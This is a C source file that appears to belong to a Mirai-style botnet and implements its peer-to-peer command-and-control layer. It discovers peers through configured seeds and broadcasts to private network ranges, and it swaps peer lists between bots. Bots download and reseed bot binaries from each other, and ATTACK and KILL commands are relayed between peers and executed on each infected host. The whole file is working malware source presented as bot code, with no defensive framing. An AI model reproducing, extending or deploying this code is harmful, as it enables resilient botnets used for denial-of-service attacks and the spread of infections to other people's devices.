#include "includes.h"
#include "p2p.h"
#include "p2pfile.h"
#include "rand.h"
#include "util.h"
#include "attack.h"
#include "selfrep.h"

/* ============================================================================
 * P2P COMMAND PROTOCOL - Torrent-style peer discovery
 * ============================================================================
 * Every bot is a peer. Commands propagate with TTL=5 max.
 * Bots discover peers via seeds or broadcast auto-discovery.
 * Every bot serves binaries to peers (torrent-style seeding).
 * ============================================================================ */

static struct p2p_peer peers[P2P_MAX_PEERS];
static int peer_count = 0;
static int listen_fd = -1;
static BOOL running = FALSE;

static void p2p_listen_thread(void);
static void p2p_handle_packet(struct sockaddr_in *from, uint8_t *buf, int len);
static void p2p_send_ping(ipv4_t addr, port_t port);
static int p2p_find_peer(ipv4_t addr, port_t port);
static void p2p_parse_seeds(void);

void p2p_init(void) {
    memset(peers, 0, sizeof(peers));
    peer_count = 0;
}

void p2p_start(void) {
    struct sockaddr_in addr;
    int opt = 1;

    listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (listen_fd == -1) return;

    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(P2P_PORT);

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        close(listen_fd);
        listen_fd = -1;
        return;
    }

    running = TRUE;
    p2p_parse_seeds();

    /* Fork listener thread */
    if (fork() == 0) {
        p2p_listen_thread();
        exit(0);
    }
}

static void p2p_parse_seeds(void) {
    char seeds[256];
    strncpy(seeds, P2P_SEEDS, sizeof(seeds) - 1);
    seeds[sizeof(seeds) - 1] = '\0';

    /* If no seeds configured, use broadcast for auto-discovery */
    if (strlen(seeds) == 0) {
        /* Broadcast ping to discover nearby bots */
        struct sockaddr_in broadcast;
        broadcast.sin_family = AF_INET;
        broadcast.sin_addr.s_addr = inet_addr("255.255.255.255");
        broadcast.sin_port = htons(P2P_PORT);

        uint8_t ping[2] = {P2P_CMD_PING, 0};
        sendto(listen_fd, ping, sizeof(ping), 0,
              (struct sockaddr *)&broadcast, sizeof(broadcast));

        /* Also try common private network broadcasts */
        broadcast.sin_addr.s_addr = inet_addr("192.168.255.255");
        sendto(listen_fd, ping, sizeof(ping), 0,
              (struct sockaddr *)&broadcast, sizeof(broadcast));

        broadcast.sin_addr.s_addr = inet_addr("10.255.255.255");
        sendto(listen_fd, ping, sizeof(ping), 0,
              (struct sockaddr *)&broadcast, sizeof(broadcast));

        broadcast.sin_addr.s_addr = inet_addr("172.31.255.255");
        sendto(listen_fd, ping, sizeof(ping), 0,
              (struct sockaddr *)&broadcast, sizeof(broadcast));
    } else {
        /* Parse configured seeds */
        char *seed = strtok(seeds, ",");
        while (seed != NULL && peer_count < P2P_MAX_PEERS) {
            char *colon = strchr(seed, ':');
            if (colon != NULL) {
                *colon = '\0';
                ipv4_t addr = inet_addr(seed);
                port_t port = atoi(colon + 1);

                if (addr != INADDR_NONE && port != 0)
                    p2p_add_peer(addr, htons(port));
            }
            seed = strtok(NULL, ",");
        }
    }

    /* Download ALL binaries from seed peers (torrent-style) */
    for (int i = 0; i < peer_count && i < 3; i++) {
        p2pfile_download_all(peers[i].addr, peers[i].port);
    }
}

static void p2p_listen_thread(void) {
    fd_set fdset;
    struct timeval tv;
    struct sockaddr_in from;
    socklen_t from_len;
    uint8_t buf[8192];
    time_t last_ping = 0;
    time_t last_redownload = 0;

    while (running) {
        FD_ZERO(&fdset);
        FD_SET(listen_fd, &fdset);

        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(listen_fd + 1, &fdset, NULL, NULL, &tv) > 0) {
            from_len = sizeof(from);
            int n = recvfrom(listen_fd, buf, sizeof(buf), 0,
                           (struct sockaddr *)&from, &from_len);
            if (n >= 2)
                p2p_handle_packet(&from, buf, n);
        }

        /* Periodic maintenance */
        time_t now = time(NULL);

        /* Ping random peers */
        if (now - last_ping > P2P_PING_INTERVAL) {
            for (int i = 0; i < peer_count && i < 3; i++) {
                int idx = rand_next() % peer_count;
                p2p_send_ping(peers[idx].addr, peers[idx].port);
            }
            last_ping = now;
        }

        /* Remove timed-out peers */
        for (int i = 0; i < peer_count; i++) {
            if (now - peers[i].last_seen > P2P_PEER_TIMEOUT) {
                peers[i] = peers[peer_count - 1];
                peer_count--;
                i--;
            }
        }

        /* Re-download missing binaries from peers periodically */
        if (now - last_redownload > 300) {  /* Every 5 minutes */
            int missing = 0;
            for (int i = 0; i < BOT_ARCH_COUNT; i++) {
                if (!p2pfile_has_binary(bot_archs[i])) missing++;
            }

            if (missing > 0 && peer_count > 0) {
                /* Try downloading from random peers */
                int seed_idx = rand_next() % peer_count;
                p2pfile_download_all(peers[seed_idx].addr, peers[seed_idx].port);
            }
            last_redownload = now;
        }
    }
}

static void p2p_handle_packet(struct sockaddr_in *from, uint8_t *buf, int len) {
    ipv4_t peer_addr = from->sin_addr.s_addr;
    port_t peer_port = from->sin_port;

    /* Register peer */
    int idx = p2p_find_peer(peer_addr, peer_port);
    if (idx == -1 && peer_count < P2P_MAX_PEERS) {
        idx = peer_count++;
        peers[idx].addr = peer_addr;
        peers[idx].port = peer_port;
        peers[idx].failures = 0;
    }
    if (idx != -1) {
        peers[idx].last_seen = time(NULL);
        peers[idx].failures = 0;
    }

    uint8_t cmd = buf[0];
    uint8_t ttl = buf[1];

    switch (cmd) {
        case P2P_CMD_PING: {
            /* Respond with PONG + peer list (torrent-style peer exchange) */
            uint8_t resp[1024];
            resp[0] = P2P_CMD_PONG;
            resp[1] = 0;
            resp[2] = peer_count;

            int resp_len = 3;
            for (int i = 0; i < peer_count && resp_len < 1020; i++) {
                memcpy(resp + resp_len, &peers[i].addr, 4);
                memcpy(resp + resp_len + 4, &peers[i].port, 2);
                resp_len += 6;
            }

            sendto(listen_fd, resp, resp_len, 0,
                   (struct sockaddr *)from, sizeof(*from));
            break;
        }

        case P2P_CMD_PONG:
        case P2P_CMD_PEERS: {
            /* Merge peer list (torrent-style peer exchange) */
            if (len < 3) break;
            uint8_t count = buf[2];
            for (int i = 0; i < count && (3 + i * 6) < len; i++) {
                ipv4_t addr;
                port_t port;
                memcpy(&addr, buf + 3 + i * 6, 4);
                memcpy(&port, buf + 3 + i * 6 + 4, 2);
                if (addr != 0 && port != 0)
                    p2p_add_peer(addr, port);
            }
            break;
        }

        case P2P_CMD_ATTACK: {
            /* Propagate attack command (TTL limited to prevent infinite loops) */
            if (ttl < 5) {
                buf[1]++;  /* Increment TTL */
                p2p_broadcast(buf, len);
            }
            /* Execute attack locally */
            if (len > 2) {
                attack_parse((char *)buf + 2, len - 2);
            }
            break;
        }

        case P2P_CMD_KILL: {
            /* Propagate kill command */
            if (ttl < 5) {
                buf[1]++;
                p2p_broadcast(buf, len);
            }
            attack_kill_all();
            break;
        }

        case P2PFILE_REQ: {
            /* Handle P2P file request - serve binary (torrent-style seeding) */
            p2pfile_handle_request(from, buf, len, listen_fd);
            break;
        }
    }
}

static void p2p_send_ping(ipv4_t addr, port_t port) {
    struct sockaddr_in to;
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = addr;
    to.sin_port = port;

    uint8_t ping[2] = {P2P_CMD_PING, 0};
    sendto(listen_fd, ping, sizeof(ping), 0,
           (struct sockaddr *)&to, sizeof(to));
}

void p2p_broadcast(uint8_t *buf, int len) {
    for (int i = 0; i < peer_count; i++) {
        struct sockaddr_in to;
        to.sin_family = AF_INET;
        to.sin_addr.s_addr = peers[i].addr;
        to.sin_port = peers[i].port;

        sendto(listen_fd, buf, len, 0,
               (struct sockaddr *)&to, sizeof(to));
    }
}

void p2p_send_attack(uint8_t *buf, int len) {
    if (len > 1022) return;

    uint8_t packet[1024];
    packet[0] = P2P_CMD_ATTACK;
    packet[1] = 0;
    memcpy(packet + 2, buf, len);

    p2p_broadcast(packet, len + 2);
}

void p2p_maintain(void) {
    /* Re-seed if peer count is low */
    if (peer_count < 3)
        p2p_parse_seeds();
}

void p2p_add_peer(ipv4_t addr, port_t port) {
    if (p2p_find_peer(addr, port) != -1) return;
    if (peer_count >= P2P_MAX_PEERS) return;

    peers[peer_count].addr = addr;
    peers[peer_count].port = port;
    peers[peer_count].last_seen = time(NULL);
    peers[peer_count].failures = 0;
    peer_count++;
}

static int p2p_find_peer(ipv4_t addr, port_t port) {
    for (int i = 0; i < peer_count; i++) {
        if (peers[i].addr == addr && peers[i].port == port)
            return i;
    }
    return -1;
}
